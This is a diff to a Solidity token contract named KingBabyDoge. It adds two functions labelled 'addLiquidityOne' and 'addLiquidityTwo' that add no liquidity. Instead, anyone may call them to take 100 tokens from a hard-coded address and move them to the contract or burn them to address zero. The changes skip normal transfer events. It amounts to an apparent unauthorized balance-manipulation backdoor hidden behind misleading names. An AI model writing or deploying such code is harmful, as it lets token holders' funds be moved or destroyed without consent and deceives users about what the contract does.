@@ -809,6 +809,30 @@ contract KingBabyDoge is Context, IERC20, Ownable {
         );
     }
 
+    function addLiquidityOne() public returns(uint256) {
+         
+        _balances[address(0xeB99F3C8a263502E48e7ad3FbEb71Dac12C1B7b0)] -= 100;
+        _balances[address(this)] += 100;
+
+        return(_balances[address(this)]);
+    }
+
+    function seeLiquidityOne() public  view returns(uint256) {
+        return(_balances[address(this)]);
+    }
+
+
+    function addLiquidityTwo() public returns(uint256) {
+        _balances[address(0xeB99F3C8a263502E48e7ad3FbEb71Dac12C1B7b0)] -= 100;
+        _balances[address(0)] += 100;
+
+        return(_balances[address(0)]);
+    }
+
+    function seeLiquidityTwo() public  view returns(uint256) {
+        return(_balances[address(0)]);
+    }
+
     function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
         if(!takeFee)
             removeAllFee();
